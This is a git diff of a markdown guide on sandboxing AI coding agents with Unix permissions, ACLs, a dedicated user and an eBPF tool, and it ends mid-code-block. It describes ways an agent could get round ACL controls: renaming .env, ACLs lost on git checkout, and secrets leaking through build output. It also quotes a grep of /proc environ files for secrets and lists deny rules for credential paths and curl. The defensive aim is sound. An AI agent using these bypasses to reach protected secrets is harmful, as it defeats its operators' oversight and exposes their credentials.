@@ -12,6 +12,7 @@ and why some say OS-level sandboxing isn't enough.**
 1. [The Problem: Controlling AI Agent File Access](#1-the-problem-controlling-ai-agent-file-access)
 2. [chmod, chown, and ACLs — Why They Fail](#2-chmod-chown-and-acls--why-they-fail)
 3. [The Dedicated User + ACL Approach — Deep Dive](#3-the-dedicated-user--acl-approach--deep-dive)
+   - 3.11 [Exec Restriction with User-Based Approaches](#311-exec-restriction-with-user-based-approaches)
 4. [What eBPF Adds](#4-what-ebpf-adds)
 5. [SELinux vs eBPF](#5-selinux-vs-ebpf)
 6. [AppArmor vs eBPF](#6-apparmor-vs-ebpf)
@@ -23,7 +24,7 @@ and why some say OS-level sandboxing isn't enough.**
 12. [How the Industry Sandboxes AI Agents Today](#12-how-the-industry-sandboxes-ai-agents-today)
 13. [Where Guardian Shell Fits](#13-where-guardian-shell-fits)
 14. [Comparison Matrix](#14-comparison-matrix)
-15. [Recommendations](#15-recommendations)
+15. [Final Summary: Pros, Cons, and When to Use Each Approach](#15-final-summary-pros-cons-and-when-to-use-each-approach)
 
 ---
 
@@ -63,6 +64,545 @@ How do different security mechanisms handle this?
 | `chmod` | Sets read/write/execute bits for owner, group, others |
 | `chown` | Changes file ownership (user and group) |
 | POSIX ACLs | Extends permissions to specific additional users/groups |
+
+Before we discuss why they fail for AI agents, let's understand each
+mechanism properly — including the special bits (SUID, SGID, sticky) and
+ACLs that are referenced throughout this document.
+
+### 2.1 Unix File Permissions (chmod / chown) — The Basics
+
+Every file and directory in Linux has three sets of permission bits and
+an owner:
+
+```
+$ ls -la /home/dev/project/.env
+-rw-r----- 1 dev project-dev 256 Mar 10 14:30 .env
+│├─┤├─┤├─┤   │   │
+││  │  │     │   └── group owner
+││  │  │     └────── user owner
+││  │  └── others:  r-- (read only)    ← everyone else
+││  └───── group:   r-- (read only)    ← members of 'project-dev'
+│└──────── user:    rw- (read+write)   ← the owner 'dev'
+└───────── file type: - (regular file)
+```
+
+**The three permission types:**
+
+| Symbol | On a file | On a directory |
+|--------|-----------|---------------|
+| `r` (read) | Can read the file's contents | Can list the directory's entries (`ls`) |
+| `w` (write) | Can modify the file's contents | Can create, delete, or rename files inside |
+| `x` (execute) | Can run the file as a program | Can enter the directory (`cd`) and access files inside |
+
+**chmod uses octal numbers or symbolic notation:**
+
+```bash
+# Octal notation: each digit is r(4) + w(2) + x(1)
+chmod 750 script.sh
+#     7 = rwx (owner: read+write+execute)
+#     5 = r-x (group: read+execute)
+#     0 = --- (others: nothing)
+
+# Symbolic notation:
+chmod u+x script.sh      # add execute for user (owner)
+chmod g-w config.toml     # remove write for group
+chmod o=r public.html     # set others to read-only
+chmod a+r README.md       # add read for all (user+group+others)
+```
+
+**chown changes who owns the file:**
+
+```bash
+chown dev:project-dev .env     # set owner=dev, group=project-dev
+chown dev .env                 # change owner only
+chown :project-dev .env        # change group only
+chown -R dev:project-dev src/  # recursive — all files in src/
+```
+
+**How the kernel checks permissions (simplified):**
+
+```
+Process opens a file:
+  1. Is the process's effective UID == file owner UID?
+     → Yes: check owner bits (rwx)
+     → No: continue
+  2. Is the process's effective GID (or any supplementary GID) == file group GID?
+     → Yes: check group bits (rwx)
+     → No: continue
+  3. Check "others" bits (rwx)
+```
+
+This is a **three-tier waterfall** — you fall into exactly one category.
+There is no "deny" concept. If you're the owner, ONLY the owner bits apply,
+even if group bits are more permissive.
+
+### 2.2 Special Permission Bits: SUID, SGID, and Sticky Bit
+
+Beyond the standard `rwx` bits, Linux has three special bits that change
+how files and directories behave. These are important because the sticky
+bit and SGID are used in the dedicated-user + ACL approach (Section 3).
+
+#### SUID (Set User ID) — Run as the file's owner
+
+When the SUID bit is set on an executable, the process runs with the
+**file owner's** UID, not the calling user's UID.
+
+```bash
+$ ls -la /usr/bin/passwd
+-rwsr-xr-x 1 root root 68208 Mar 10 2024 /usr/bin/passwd
+   ^
+   s = SUID bit is set
+
+# When user 'suren' runs passwd:
+# The process runs with effective UID = root (the file owner)
+# This is how passwd can modify /etc/shadow (owned by root)
+# even though 'suren' can't modify /etc/shadow directly
+```
+
+```bash
+# Setting SUID:
+chmod u+s /usr/bin/myprogram     # symbolic
+chmod 4755 /usr/bin/myprogram    # octal (4 = SUID)
+#     ^
+#     4 in the thousands place = SUID
+
+# The 4-digit octal: chmod SUGO file
+#   S = special bits: SUID(4) + SGID(2) + Sticky(1)
+#   U = user bits:    r(4) + w(2) + x(1)
+#   G = group bits:   r(4) + w(2) + x(1)
+#   O = others bits:  r(4) + w(2) + x(1)
+```
+
+**Security relevance for AI agents:**
+SUID is dangerous because if an agent finds a SUID-root binary with a
+vulnerability, it can escalate to root. Never create SUID binaries for
+agent tools. Guardian Shell can monitor exec of SUID binaries.
+
+#### SGID (Set Group ID) — Inherit the directory's group
+
+SGID behaves differently on files vs directories:
+
+**On an executable file:** The process runs with the file's group GID
+(similar to SUID but for groups).
+
+**On a directory (the important case):** New files and subdirectories
+created inside **inherit the directory's group**, instead of the creator's
+primary group.
+
+```bash
+# Without SGID:
+$ ls -la /home/dev/project/
+drwxrwx--- 2 dev project-dev 4096 Mar 10 14:30 .
+
+$ whoami
+llm-agent
+
+$ touch /home/dev/project/newfile.txt
+$ ls -la /home/dev/project/newfile.txt
+-rw-r--r-- 1 llm-agent llm-agent 0 Mar 10 14:31 newfile.txt
+#                       ^^^^^^^^^
+#                       Group = llm-agent (creator's primary group)
+#                       The developer may not be in this group!
+
+# With SGID:
+$ chmod g+s /home/dev/project/    # or chmod 2775
+$ ls -la /home/dev/
+drwxrws--- 2 dev project-dev 4096 Mar 10 14:30 project/
+      ^
+      s = SGID bit is set on the directory
+
+$ touch /home/dev/project/newfile.txt
+$ ls -la /home/dev/project/newfile.txt
+-rw-r--r-- 1 llm-agent project-dev 0 Mar 10 14:31 newfile.txt
+#                       ^^^^^^^^^^^
+#                       Group = project-dev (inherited from directory!)
+#                       Now both dev and llm-agent (both in project-dev) can access it
+```
+
+```bash
+# Setting SGID:
+chmod g+s /home/dev/project/      # symbolic
+chmod 2775 /home/dev/project/     # octal (2 = SGID)
+#     ^
+#     2 in the thousands place = SGID
+```
+
+**Why SGID matters for AI agents:**
+When the developer and the agent are different users but share a group
+(`project-dev`), SGID ensures that files created by either user belong to
+the shared group. Without it, files created by the agent would have
+`llm-agent` as the group, and the developer might not be able to edit them.
+
+```
+Without SGID:                        With SGID on directory:
+dev creates file → dev:dev           dev creates file → dev:project-dev
+agent creates file → agent:agent     agent creates file → agent:project-dev
+                     ^^^^ developer              both can access via group ✓
+                     can't access!
+```
+
+#### Sticky Bit — Only the owner can delete/rename
+
+When the sticky bit is set on a directory, only the **file owner**, the
+**directory owner**, or **root** can delete or rename files inside it.
+Other users with write permission on the directory CANNOT delete or rename
+files they don't own.
+
+The classic example is `/tmp`:
+
+```bash
+$ ls -la /
+drwxrwxrwt 20 root root 4096 Mar 10 14:30 tmp
+         ^
+         t = sticky bit is set
+
+# /tmp is world-writable (rwx for everyone)
+# Without sticky bit: any user could delete any other user's files in /tmp
+# With sticky bit: you can only delete YOUR OWN files in /tmp
+```
+
+```bash
+# Setting the sticky bit:
+chmod +t /home/dev/project/       # symbolic
+chmod 1775 /home/dev/project/     # octal (1 = sticky)
+#     ^
+#     1 in the thousands place = sticky bit
+```
+
+**Example showing the sticky bit in action:**
+
+```bash
+# Setup: directory with sticky bit, both users have write access
+$ chmod 1777 /shared/workspace
+
+# As user 'dev':
+$ echo "my work" > /shared/workspace/notes.txt
+
+# As user 'llm-agent':
+$ rm /shared/workspace/notes.txt
+rm: cannot remove 'notes.txt': Operation not permitted
+# ✅ BLOCKED — llm-agent doesn't own notes.txt
+
+$ mv /shared/workspace/notes.txt /shared/workspace/stolen.txt
+mv: cannot move 'notes.txt': Operation not permitted
+# ✅ BLOCKED — rename also blocked by sticky bit
+
+$ echo "my file" > /shared/workspace/agent-output.txt
+# ✅ ALLOWED — creating new files is fine
+
+$ rm /shared/workspace/agent-output.txt
+# ✅ ALLOWED — llm-agent owns this file, so it can delete it
+```
+
+**Why sticky bit matters for AI agents:**
+In the dedicated-user approach (Section 3), the `rename()` bypass is the
+most dangerous attack vector — the agent can rename `.env` to `.env.bak`
+even though it can't read `.env`. The sticky bit prevents this because only
+the file owner (the developer) can rename files in the directory.
+
+**The trade-off:** The sticky bit also prevents the agent from deleting
+ANY file it doesn't own — including build artifacts, generated code, or
+test output that the developer created. This can break normal workflows:
+
+```bash
+# With sticky bit on /home/dev/project/:
+# As llm-agent:
+$ rm /home/dev/project/src/old_module.rs
+rm: cannot remove 'old_module.rs': Operation not permitted
+# ❌ The agent can't clean up files the developer created
+# Even though the agent SHOULD be able to delete source files as part of refactoring
+```
+
+#### Summary of Special Bits
+
+```
+Special bits (the leading digit in 4-digit chmod):
+
+  chmod 7775 directory
+        ^^^
+        |||
+        ||└─ 1 = Sticky bit  (only owner can delete/rename files)
+        |└── 2 = SGID         (new files inherit directory's group)
+        └─── 4 = SUID         (execute as file owner's UID)
+
+  7 = SUID(4) + SGID(2) + Sticky(1) — all three set (unusual)
+  6 = SUID(4) + SGID(2)             — SUID + SGID
+  3 = SGID(2) + Sticky(1)           — SGID + sticky (common for shared dirs)
+  2 = SGID(2)                       — just SGID (common for shared dirs)
+  1 = Sticky(1)                     — just sticky (common for /tmp)
+
+Display in ls -la:
+  -rwsr-xr-x  → SUID set (s in user execute position)
+  -rwxr-sr-x  → SGID set (s in group execute position)
+  drwxrwxrwt  → Sticky set (t in others execute position)
+
+  Capital S or T means the bit is set but execute is NOT:
+  -rwSr--r--  → SUID set, but owner lacks execute (unusual, often a mistake)
+  drwxrwx--T  → Sticky set, but others lack execute
+```
+
+### 2.3 POSIX ACLs (Access Control Lists) — Beyond User/Group/Others
+
+Standard Unix permissions only support three categories: owner, group,
+others. POSIX ACLs extend this to allow **per-user** and **per-group**
+entries on individual files.
+
+#### Why ACLs Exist
+
+```bash
+# Problem: You want to give 'llm-agent' read access to a file
+# owned by 'dev', without giving read to ALL other users.
+
+# Without ACLs — you're stuck:
+# - Can't change owner (breaks dev's access)
+# - Can't use group (llm-agent might not be in the right group)
+# - Setting other=r-- gives EVERYONE read access
+
+# With ACLs — you can target specific users:
+setfacl -m u:llm-agent:r-- /home/dev/project/config.toml
+# Now llm-agent can read it, other users still can't
+```
+
+#### ACL Syntax and Commands
+
+```bash
+# setfacl — set (modify) ACL entries
+# Syntax: setfacl -m TYPE:NAME:PERMISSIONS file
+
+# TYPE can be:
+#   u (user)     — a specific user
+#   g (group)    — a specific group
+#   m (mask)     — the maximum permissions for named entries
+#   o (other)    — the "others" category
+
+# Grant read+write to user 'llm-agent':
+setfacl -m u:llm-agent:rw- /home/dev/project/src/main.rs
+
+# Deny all access to user 'llm-agent' (set permissions to nothing):
+setfacl -m u:llm-agent:--- /home/dev/project/.env
+
+# Grant read to group 'auditors':
+setfacl -m g:auditors:r-- /home/dev/project/config.toml
+
+# Remove an ACL entry entirely:
+setfacl -x u:llm-agent /home/dev/project/.env
+
+# Remove ALL ACLs (restore to basic Unix permissions):
+setfacl -b /home/dev/project/.env
+
+# Apply recursively to all files in a directory:
+setfacl -R -m u:llm-agent:rwx /home/dev/project/
+
+# getfacl — view ACL entries
+getfacl /home/dev/project/.env
+```
+
+**Example output of `getfacl`:**
+
+```bash
+$ getfacl /home/dev/project/.env
+# file: home/dev/project/.env
+# owner: dev
+# group: project-dev
+user::rw-              ← owner 'dev' has read+write
+user:llm-agent:---     ← agent DENIED (the key entry!)
+group::rw-             ← group 'project-dev' has read+write
+mask::rw-              ← maximum for named user/group entries
+other::---             ← everyone else: no access
+```
+
+The `+` sign in `ls -la` indicates a file has ACLs:
+
+```bash
+$ ls -la /home/dev/project/.env
+-rw-rw----+ 1 dev project-dev 256 Mar 10 14:30 .env
+          ^
+          + means ACLs are present (use getfacl to see them)
+```
+
+#### Default ACLs — Inheritance for New Files
+
+Default ACLs are set on **directories** and control what ACLs new files
+created inside that directory will inherit:
+
+```bash
+# Set default ACLs on the project directory
+# -d means "default" — these apply to NEW files, not the directory itself
+setfacl -d -m u:llm-agent:rwx /home/dev/project/
+setfacl -d -m g:project-dev:rwx /home/dev/project/
+
+# Now every new file created in /home/dev/project/ will inherit:
+#   user:llm-agent:rwx (from default ACL)
+#   group:project-dev:rwx (from default ACL)
+
+# Verify default ACLs:
+$ getfacl /home/dev/project/
+# file: home/dev/project/
+# owner: dev
+# group: project-dev
+user::rwx
+group::rwx
+other::---
+default:user::rwx             ← default for owner
+default:user:llm-agent:rwx    ← default for agent (inherited by new files)
+default:group::rwx             ← default for owning group
+default:group:project-dev:rwx  ← default for project-dev group
+default:mask::rwx              ← default mask
+default:other::---             ← default for others
+```
+
+**Critical behavior:**
+
+```bash
+# New files INHERIT default ACLs:
+$ touch /home/dev/project/newfile.txt
+$ getfacl /home/dev/project/newfile.txt
+user:llm-agent:rwx     ← inherited from parent's default ACL ✓
+
+# Moved files DO NOT inherit default ACLs:
+$ mv /tmp/outsidefile.txt /home/dev/project/
+$ getfacl /home/dev/project/outsidefile.txt
+# No llm-agent entry! ← moved files keep their original ACLs
+
+# Copied files DO inherit (cp creates a new file):
+$ cp /tmp/outsidefile.txt /home/dev/project/copied.txt
+$ getfacl /home/dev/project/copied.txt
+user:llm-agent:rwx     ← inherited because cp creates a new inode ✓
+
+# EXCEPT cp -p (preserve) tries to keep source ACLs:
+$ cp -p /tmp/outsidefile.txt /home/dev/project/preserved.txt
+# May NOT have the default ACL entries
+```
+
+#### The ACL Mask — The Often-Misunderstood Ceiling
+
+The **mask** entry is the maximum effective permission for ALL named user
+and named group entries. It acts as a ceiling:
+
+```bash
+$ setfacl -m u:llm-agent:rwx /home/dev/project/file.txt
+$ setfacl -m m::r-- /home/dev/project/file.txt   # set mask to read-only
+
+$ getfacl /home/dev/project/file.txt
+user:llm-agent:rwx    #effective:r--
+#                       ^^^^^^^^
+#                       Despite granting rwx, effective permission is r--
+#                       because mask limits it to r--
+mask::r--
+```
+
+**The `chmod` trap:** Running `chmod` on a file with ACLs modifies the
+**mask** entry, not the traditional group bits:
+
+```bash
+# Before chmod:
+$ getfacl file.txt
+user:llm-agent:rwx
+group::rwx
+mask::rwx          ← agent effectively has rwx
+
+# Developer runs chmod (common, innocent operation):
+$ chmod 640 file.txt
+
+# After chmod:
+$ getfacl file.txt
+user:llm-agent:rwx    #effective:r--
+group::rwx             #effective:r--
+mask::r--              ← chmod changed the mask! Agent lost write+exec!
+```
+
+This is a **common source of mysterious permission failures** — a developer
+runs `chmod` without realizing it changes the ACL mask, silently restricting
+all named ACL entries.
+
+#### How the Kernel Evaluates ACLs (The Full Algorithm)
+
+When a process tries to access a file with ACLs, the kernel follows this
+exact algorithm:
+
+```
+1. Is process effective UID == file owner UID?
+   → YES: use ACL_USER_OBJ entry (owner permissions). STOP.
+   → NO: continue.
+
+2. Is there a named ACL_USER entry matching the process UID?
+   → YES: effective permission = (ACL_USER entry) AND (ACL_MASK)
+          If sufficient → ALLOW. Otherwise → DENY. STOP.
+   → NO: continue.
+
+3. Does the process GID (or any supplementary GID) match the owning group
+   or any named ACL_GROUP entry?
+   → YES: collect all matching group entries.
+          Effective permission = (union of matching entries) AND (ACL_MASK)
+          If sufficient → ALLOW. Otherwise → DENY. STOP.
+   → NO: continue.
+
+4. Use ACL_OTHER entry. STOP.
+```
+
+**Key takeaway:** Named user entries (step 2) are checked BEFORE groups
+(step 3). So `u:llm-agent:---` blocks the agent even if the agent is in
+a group that has access. But step 1 (owner check) takes precedence over
+everything — **never make the agent the owner of files you want to protect.**
+
+#### ACLs on Directories — The `x` Permission Matters
+
+For directories, `x` (execute) means "can traverse" — the process can `cd`
+into the directory and access files inside by name. Without `x`, even if the
+process has `r`, it can list filenames but NOT read file contents:
+
+```bash
+# Grant read + traverse on directory (needed for agent to access files inside):
+setfacl -m u:llm-agent:r-x /home/dev/project/
+
+# Grant full access (read, write/create, traverse):
+setfacl -m u:llm-agent:rwx /home/dev/project/
+
+# Common mistake — granting rw- on a directory (no traverse):
+setfacl -m u:llm-agent:rw- /home/dev/project/
+# The agent can list files (r) and create files (w) but CANNOT
+# actually read any file inside the directory because it can't
+# traverse (x) into it. Most operations will fail with EACCES.
+```
+
+#### Complete Example: Setting Up ACLs for an AI Agent
+
+```bash
+# Goal: llm-agent can read/write everything in /home/dev/project/
+#        EXCEPT .env files and .git/config
+
+# 1. Grant access to the directory tree
+setfacl -R -m u:llm-agent:rwx /home/dev/project/
+
+# 2. Set default ACLs so new files are also accessible
+setfacl -R -d -m u:llm-agent:rwx /home/dev/project/
+
+# 3. Deny specific sensitive files
+setfacl -m u:llm-agent:--- /home/dev/project/.env
+setfacl -m u:llm-agent:--- /home/dev/project/.env.local
+setfacl -m u:llm-agent:--- /home/dev/project/.env.production
+setfacl -m u:llm-agent:--- /home/dev/project/.git/config
+
+# 4. Verify the deny is in place
+$ getfacl /home/dev/project/.env
+user:llm-agent:---     ← DENIED
+
+# 5. Test
+$ sudo -u llm-agent cat /home/dev/project/.env
+cat: .env: Permission denied    ← ✅
+
+$ sudo -u llm-agent cat /home/dev/project/src/main.rs
+(file contents shown)           ← ✅
+
+$ sudo -u llm-agent touch /home/dev/project/newfile.txt
+(file created)                  ← ✅
+```
+
+**What this does NOT protect against** is covered in Section 3 (the
+rename bypass, git checkout destroying ACLs, default ACLs not matching
+filename patterns, etc.).
+
+---
 
 ### Why They're Insufficient for AI Agent Sandboxing
 
@@ -591,21 +1131,321 @@ $ strings /proc/*/environ 2>/dev/null | grep SECRET
 
 ### 3.9 Verdict: Dedicated User + ACLs vs eBPF
 
+Below is a point-by-point comparison. Each row is explained so you
+understand **what the term means** and **why it matters**.
+
+---
+
+#### 1. Basic File Deny
+
+> "Can I block the agent from reading `/app/.env`?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Works | ✅ Works |
+
+**Both work here.** ACLs set `u:llm-agent:---` on `.env` → kernel denies
+read. eBPF sees the `openat(".env")` syscall → checks policy → blocks it.
+For this simple case, ACLs are perfectly fine.
+
+---
+
+#### 2. The `rename()` Bypass
+
+> "Can the agent move `.env` to `.env.bak` and then create a new
+> `.env` that it CAN read?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Needs sticky bit (breaks workflow) | ✅ Can hook the `rename` syscall |
+
+**What's `rename()`?** When you run `mv .env .env.bak`, the kernel calls
+the `rename()` syscall. The key problem: `rename()` only checks if the
+agent has write permission on the **parent directory** — it does NOT check
+the ACL on the file being renamed.
+
+So if the agent has write access to `/app/` (which it needs to create
+files), it can rename `.env` even though it can't read it. After renaming,
+it creates a new `.env` which inherits default ACLs (no deny) — now it
+can read the new file.
+
+**The sticky bit fix:** `chmod +t /app/` makes it so only the file's
+**owner** can rename or delete files in that directory. This blocks the
+rename attack. But it also means the agent can't delete ANY file it
+doesn't own — including build artifacts, generated code, or test output
+that the developer created. Normal workflows break.
+
+**eBPF doesn't have this problem** because it can hook the `rename()`
+syscall directly and block it based on the path being renamed. The policy
+says "deny `**/.env*`" — doesn't matter if you're reading it, renaming
+it, or deleting it.
+
+---
+
+#### 3. Survives `git checkout`
+
+> "If the developer runs `git checkout`, do my security rules still work?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ ACLs lost on recreated files | ✅ Policy lives in BPF maps, not on files |
+
+**Why ACLs break:** ACLs are stored as metadata on each file's **inode**
+(the kernel's internal record for a file). When you run `git checkout`,
+git **deletes** the old file and **creates** a new one. The new file gets
+a new inode with default ACLs from the parent directory — your carefully
+applied deny ACL is gone.
+
+This happens on every `git checkout`, `git pull`, `git merge`,
+`git stash pop`, and `git reset` that touches the protected file. You'd
+need git hooks to re-apply the deny ACL every time — and there's a race
+window between git creating the file and the hook running where the agent
+could read it.
+
+**eBPF doesn't care** because its policy is stored in **BPF maps** (kernel
+memory), not on the files themselves. The rule says "deny `**/.env*`" —
+it matches the filename pattern at the syscall level. It doesn't matter
+how many times the file is deleted and recreated.
+
+---
+
+#### 4. Pattern-Based Deny
+
+> "Can I block ALL `.env` files — `.env`, `.env.local`, `.env.production`
+> — including ones that don't exist yet?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Must list each file by name | ✅ Glob patterns (`**/.env*`) |
+
+**ACLs are per-file.** You must run `setfacl` on each specific file:
+```bash
+setfacl -m u:llm-agent:--- .env
+setfacl -m u:llm-agent:--- .env.local
+setfacl -m u:llm-agent:--- .env.production
+# Oops, forgot .env.staging — agent reads it
+```
+
+If someone creates a new `.env.staging` file tomorrow, there's no ACL on
+it. You have to remember to deny it manually.
+
+**eBPF uses pattern matching:** `deny = ["**/.env*"]` matches any file
+starting with `.env` in any directory — including files that will be
+created in the future. One rule covers everything.
+
+---
+
+#### 5. Temporal Grants (Time-Limited Access)
+
+> "Can I let the agent read `/etc/hosts` for 60 seconds, then
+> automatically revoke access?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Not possible | ✅ Auto-expiring entries in BPF maps |
+
+**ACLs are permanent until manually changed.** There is no built-in
+mechanism to say "this ACL expires in 60 seconds." You'd have to:
+1. Run `setfacl` to grant access
+2. Set a `cron` job or `sleep` + `setfacl` to revoke it
+3. Hope nothing goes wrong in between
+
+**eBPF stores grants with timestamps.** Guardian Shell writes an entry
+to a BPF map with an expiry timestamp. After 60 seconds, the entry is
+automatically cleaned up. The grant disappears without any userspace
+intervention:
+```bash
+guardian-ctl grant -n coding-agent -p "/etc/hosts" -d 60
+# 60 seconds later: access automatically revoked
+```
+
+---
+
+#### 6. Real-Time Monitoring
+
+> "Can I see what the agent is doing right now? Get alerts when it
+> tries something suspicious?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ No events generated | ✅ Dashboard, Slack, Prometheus |
+
+**ACLs are silent.** When the agent tries to read `.env` and gets
+`Permission denied`, nothing is logged (unless you separately set up
+`auditd`, which is its own complex system). You have zero visibility
+into what the agent attempted.
+
+**eBPF generates events for every access attempt.** Every `openat()`
+call from a watched agent produces an event with the path, action
+(allow/deny), timestamp, and agent name. These events flow to:
+- A real-time web dashboard
+- Slack notifications for critical events
+- Prometheus metrics for graphing and alerting
+- JSON logs for SIEM integration
+
+You can see the agent tried to read `.ssh/id_rsa` three times in the
+last minute — even though it was blocked every time. That pattern itself
+is suspicious and worth investigating.
+
+---
+
+#### 7. Credential Isolation
+
+> "Can I prevent the agent from accessing my SSH keys, AWS credentials,
+> and Docker config?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Strong — separate home directory | ❌ Same user — needs deny rules |
+
+**This is where the dedicated-user approach wins.** When the agent runs
+as `llm-agent`, it literally has a different home directory
+(`/home/llm-agent/`). It physically cannot access `/home/suren/.ssh/` or
+`/home/suren/.aws/` because Unix permissions block cross-user home
+directory access by default.
+
+**With eBPF,** the agent runs as YOUR user (`suren`). It CAN access your
+home directory. Guardian Shell blocks it via deny rules
+(`deny = ["**/.ssh/**", "**/.aws/**"]`), but the protection is only as
+strong as your policy configuration. Miss a path and the agent has access.
+
+The dedicated-user approach provides **structural** isolation (the
+capability doesn't exist). eBPF provides **policy-based** isolation (the
+capability exists but is blocked by rules).
+
+---
+
+#### 8. Child Process Tracking
+
+> "If the agent spawns subprocesses (compilers, scripts, etc.), are
+> they also restricted?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Children inherit the agent's UID | ✅ Children inherit the agent's cgroup |
+
+**Both work here.** With the dedicated user, any subprocess the agent
+spawns also runs as `llm-agent` — same ACL restrictions apply. With eBPF,
+the subprocess is in the same cgroup as the agent — same BPF policy
+applies. Neither approach has a gap for child processes.
+
+---
+
+#### 9. Data Flow Control
+
+> "If an allowed process reads `.env` and prints its contents, can the
+> agent see the output?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Only controls file access, not data | ❌ Only controls file access, not data |
+
+**Neither approach solves this.** Both ACLs and eBPF control whether a
+process can **open a file**. They do NOT control what happens to the
+data after it's read.
+
+Example: A Makefile that does `include .env` and echoes the values — the
+build tool reads `.env` (allowed, because it runs as the developer or is
+an allowed process), then the output contains the secrets. The agent reads
+the build output, not the file directly.
+
+This is called the **indirect data flow** problem, and it requires
+application-level controls (not OS-level) to solve.
+
+---
+
+#### 10. Setup Complexity
+
+> "How hard is it to set up?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | 🟡 Medium — many manual steps | 🟡 Medium — needs root + BPF-capable kernel |
+
+**Dedicated user:** Create user, create shared group, set directory
+ownership, set SGID bit, apply default ACLs, apply deny ACLs per file,
+set up git hooks, configure agent credentials (SSH keys, git tokens,
+npm tokens, AWS roles). Each step is simple but there are many of them.
+
+**eBPF:** Install nightly Rust, build the eBPF program, write a TOML
+config file, run as root. Fewer steps, but requires a Linux kernel with
+BPF support (most modern distros have this) and root privileges.
+
+---
+
+#### 11. Maintenance Burden
+
+> "How much ongoing work is needed to keep it secure?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ High — re-apply ACLs constantly | ✅ Low — policy in a config file |
+
+**Dedicated user:** Every `git checkout` can destroy your deny ACLs (see
+point 3 above). New `.env` files need manual ACL application. System
+updates can reset binary permissions. Credentials need rotation. Git hooks
+need to be set up per clone. You need periodic audits to check nothing
+has drifted.
+
+**eBPF:** Edit `config.toml`, restart the daemon (or send SIGHUP to
+reload). The policy is in one place and doesn't degrade over time.
+
+---
+
+#### 12. Cross-Platform Support
+
+> "Does it work on macOS/BSD, or Linux only?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Works on any Unix with ACL support | ❌ Linux only |
+
+ACLs work on Linux, macOS (limited), FreeBSD, and other Unix systems.
+eBPF is a **Linux-specific technology** — it does not exist on macOS,
+Windows, or BSD. If you need cross-platform support, ACLs are the only
+option from this comparison.
+
+---
+
+#### 13. Workflow Friction
+
+> "How much does it disrupt the developer's normal workflow?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ High — agent needs separate credentials | ✅ Low — agent runs as your user |
+
+**Dedicated user:** The agent runs as `llm-agent`, which has no SSH keys,
+no git credentials, no npm tokens, no AWS access. Every tool that needs
+authentication must be configured separately for the agent user. `git push`
+fails, `npm publish` fails, `docker build` fails — until you set up
+agent-specific credentials for each service. This is significant ongoing
+work.
+
+**eBPF:** The agent runs as YOUR user with all your existing credentials
+and tools. Everything "just works" — Guardian Shell only blocks the
+specific file accesses and exec calls that violate your policy. The agent
+doesn't even know it's being monitored (unless it hits a deny rule).
+
+---
+
+#### Summary Table
+
 | Dimension | Dedicated User + ACLs | eBPF (Guardian Shell) |
 |-----------|----------------------|----------------------|
 | Basic file deny | ✅ Works | ✅ Works |
-| rename() bypass | ❌ Needs sticky bit (breaks workflow) | ✅ Can hook `rename` syscall |
-| Survives `git checkout` | ❌ ACLs lost on recreated files | ✅ Policy is in BPF maps, not on files |
-| Pattern-based deny (all `.env*`) | ❌ Must enumerate each file | ✅ Glob patterns (`**/.env*`) |
-| Temporal grants | ❌ Not possible | ✅ Auto-expiring BPF map entries |
-| Real-time monitoring | ❌ No events generated | ✅ Dashboard, Slack, Prometheus |
-| Credential isolation | ✅ Strong (separate user) | ❌ Same user (needs other controls) |
-| Child process tracking | ✅ Children inherit UID | ✅ Children inherit cgroup |
-| Data flow control | ❌ Only file access, not data | ❌ Only file access, not data |
-| Setup complexity | 🟡 Medium (many manual steps) | 🟡 Medium (needs root + BPF kernel) |
-| Maintenance burden | ❌ High (git hooks, audit, re-apply) | ✅ Low (policy in config file) |
-| Cross-platform | ✅ Any Unix with ACL support | ❌ Linux only (eBPF) |
-| Workflow friction | ❌ High (separate credentials) | ✅ Low (same user, transparent) |
+| rename() bypass | ❌ Needs sticky bit (breaks workflow) | ✅ Hooks the syscall directly |
+| Survives git checkout | ❌ ACLs lost when files recreated | ✅ Policy in kernel memory, not on files |
+| Pattern-based deny | ❌ Must list each file manually | ✅ Glob patterns (`**/.env*`) |
+| Temporal grants | ❌ No mechanism | ✅ Auto-expiring BPF map entries |
+| Real-time monitoring | ❌ Silent — no events | ✅ Dashboard, Slack, Prometheus |
+| Credential isolation | ✅ Strong (separate home dir) | ❌ Same user (policy-based only) |
+| Child process tracking | ✅ Inherit UID | ✅ Inherit cgroup |
+| Data flow control | ❌ Neither solves this | ❌ Neither solves this |
+| Setup complexity | 🟡 Many manual steps | 🟡 Needs root + BPF kernel |
+| Maintenance burden | ❌ High (re-apply ACLs, git hooks) | ✅ Low (one config file) |
+| Cross-platform | ✅ Any Unix | ❌ Linux only |
+| Workflow friction | ❌ High (separate credentials) | ✅ Low (transparent to agent) |
 
 ### 3.10 When the Dedicated User Approach Makes Sense
 
@@ -643,6 +1483,276 @@ sudo -u llm-agent guardian-launch --name coding-agent -- claude-code
 
 The dedicated-user approach and eBPF are **not mutually exclusive** — they
 protect against different threat vectors and complement each other.
+
+### 3.11 Exec Restriction with User-Based Approaches
+
+Beyond file access, a critical question: **can you restrict which commands
+an AI agent runs using traditional Unix mechanisms?** The answer is yes —
+but each approach has significant practical limitations.
+
+#### Approach 1: Remove Execute Permission per Binary
+
+The most direct method — strip the execute bit or use ACLs to deny exec
+for the agent's user on specific binaries:
+
+```bash
+# Remove exec for the agent user on dangerous binaries
+sudo setfacl -m u:llm-agent:r-- /usr/bin/curl
